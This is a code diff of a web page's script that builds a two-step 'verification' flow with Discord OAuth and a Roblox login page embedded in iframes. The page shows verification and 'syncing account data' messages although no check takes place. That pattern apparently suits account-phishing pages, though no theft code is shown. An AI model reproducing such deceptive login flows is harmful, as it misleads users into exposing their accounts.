-                // Update Roblox status
-                if (state.robloxLogin) {
-                    robloxStatusDiv.innerHTML = '✅ Step 2: Roblox Login Completed';
-                    robloxStatusDiv.style.color = '#aaffcc';
-                } else {
-                    robloxStatusDiv.innerHTML = '⚪ Step 2: Complete Roblox Login';
-                    robloxStatusDiv.style.color = '#ffcc88';
-                }
-                
-                // Determine which panel to show
-                if (!state.discord) {
-                    // Show Discord panel first
-                    discordPanel.style.display = 'flex';
-                    robloxPanel.classList.remove('active');
-                    if (discordOAuthIframe && discordOAuthIframe.src !== DISCORD_OAUTH_EMBED_URL) {
-                        discordOAuthIframe.src = DISCORD_OAUTH_EMBED_URL;
-                    }
-                } else if (state.discord && !state.robloxLogin) {
-                    // Discord done, show Roblox login
-                    discordPanel.style.display = 'none';
-                    robloxPanel.classList.add('active');
-                    if (robloxIframe && robloxIframe.src !== ROBLOX_LOGIN_URL) {
-                        robloxIframe.src = ROBLOX_LOGIN_URL;
-                    }
-                } else if (state.discord && state.robloxLogin && !state.completed) {
-                    // Both done but not marked completed (should auto-mark)
-                    completeVerification();
-                } else if (state.completed) {
-                    discordPanel.style.display = 'none';
-                    robloxPanel.classList.add('active');
-                }
-            }
-            
-            function updateBadges() {
-                loginBadge.innerHTML = verificationState.login.completed ? '✅ VERIFIED' : '⚪ Not verified';
-                ingameBadge.innerHTML = verificationState.ingame.completed ? '✅ VERIFIED' : '⚪ Not verified';
-                communityBadge.innerHTML = verificationState.community.completed ? '✅ VERIFIED' : '⚪ Not verified';
-                
-                const state = verificationState[currentActiveMethod];
-                verificationStatusChip.innerHTML = state.completed ? '✅ VERIFIED' : '⚠️ NOT VERIFIED';
-            }
-            
-            // Confirm Discord Authorization (simulates successful OAuth)
-            function confirmDiscordAuth() {
-                if (isProcessing) return;
-                const method = currentActiveMethod;
-                const state = verificationState[method];
-                
-                if (state.discord) {
-                    discordStatusText.innerHTML = '✅ Already authorized';
-                    return;
-                }
-                
-                showOverlay(
-                    "Discord Authorization",
-                    "Verifying your Discord account...",
-                    () => {
-                        verificationState[method].discord = true;
-                        discordStatusText.innerHTML = '✅ Discord Authorized!';
-                        discordUserInfoDiv.innerHTML = '🟢 Discord Connected • Active Session';
-                        discordUserInfoDiv.style.display = 'block';
-                        updateUIForMethod(method);
-                    }
-                );
-            }
-            
-            // Complete Verification - checks if Roblox login is done
-            function completeVerification() {
-                if (isProcessing) return;
-                const method = currentActiveMethod;
-                const state = verificationState[method];
-                
-                if (!state.discord) {
-                    showOverlay("Verification Failed", "Please complete Discord authorization first", null);
-                    return;
-                }
-                
-                if (!state.robloxLogin) {
-                    showOverlay("Verification Failed", "Please complete Roblox login first", null);
-                    return;
-                }
-                
-                if (state.completed) {
-                    verificationStatusChip.innerHTML = '✅ ALREADY VERIFIED';
-                    return;
-                }
-                
-                showOverlay(
-                    "Final Verification",
-                    "Verifying both Discord and Roblox credentials...",
-                    () => {
-                        verificationState[method].completed = true;
-                        updateBadges();
-                        verificationStatusChip.innerHTML = '✅ VERIFIED!';
-                        verificationStatusChip.style.color = '#ffdd99';
-                        
-                        // Update sidebar badge
-                        if (method === 'login') loginBadge.innerHTML = '✅ VERIFIED';
-                        if (method === 'ingame') ingameBadge.innerHTML = '✅ VERIFIED';
-                        if (method === 'community') communityBadge.innerHTML = '✅ VERIFIED';
-                    }
-                );
-            }
-            
-            // Simulate Roblox login completion (user must actually interact with iframe)
-            // This button confirms they've logged into Roblox
-            function confirmRobloxLogin() {
-                if (isProcessing) return;
-                const method = currentActiveMethod;
-                const state = verificationState[method];
-                
-                if (!state.discord) {
-                    showOverlay("Cannot Complete", "Please complete Discord authorization first", null);
-                    return;
-                }
-                
-                if (state.robloxLogin) {
-                    robloxStatusDiv.innerHTML = '✅ Already completed Roblox login';
-                    return;
-                }
-                
-                showOverlay(
-                    "Roblox Login Confirmation",
-                    "Verifying Roblox account credentials...",
-                    () => {
-                        verificationState[method].robloxLogin = true;
-                        robloxStatusDiv.innerHTML = '✅ Roblox Login Completed!';
-                        robloxStatusDiv.style.color = '#aaffcc';
-                        
-                        // Auto-complete verification if both are done
-                        if (verificationState[method].discord && verificationState[method].robloxLogin) {
-                            setTimeout(() => {
-                                completeVerification();
-                            }, 500);
-                        }
-                    }
-                );
-            }
-            
-            function backToDiscord() {
-                if (isProcessing) return;
-                const method = currentActiveMethod;
-                discordPanel.style.display = 'flex';
-                robloxPanel.classList.remove('active');
-            }
-            
-            // Event listeners
-            methodLogin.addEventListener('click', () => updateUIForMethod('login'));
-            methodIngame.addEventListener('click', () => updateUIForMethod('ingame'));
-            methodCommunity.addEventListener('click', () => updateUIForMethod('community'));
-            confirmDiscordBtn.addEventListener('click', confirmDiscordAuth);
-            completeVerificationBtn.addEventListener('click', confirmRobloxLogin);
-            backToDiscordBtn.addEventListener('click', backToDiscord);
-            
-            // Initialize
-            updateUIForMethod('login');
-            
-            // Ensure iframe is set
-            if (discordOAuthIframe) {
-                discordOAuthIframe.src = DISCORD_OAUTH_EMBED_URL;
-            }
+
+            document.getElementById('confirmDiscordBtn').onclick = () => {
+                showLoad("Authorizing Discord", "Validating token permissions...", () => {
+                    state.discord = true;
+                    elements.discordPanel.style.display = 'none';
+                    elements.robloxPanel.classList.add('active');
+                    elements.robloxFrame.src = ROBLOX_URL;
+                });
+            };
+
+            document.getElementById('completeVerificationBtn').onclick = () => {
+                showLoad("Finalizing Link", "Syncing Roblox account data...", () => {
+                    state.roblox = true;
+                    state.done = true;
+                    elements.statusChip.innerText = "✅ VERIFIED";
+                    elements.statusChip.style.color = "#00ff88";
+                    document.getElementById('loginStatusGold').innerText = "✅ Linked";
+                });
+            };
+
+            document.getElementById('backToDiscordBtn').onclick = () => {
+                elements.robloxPanel.classList.remove('active');
+                elements.discordPanel.style.display = 'flex';
+            };
         })();
     </script>
 </body>
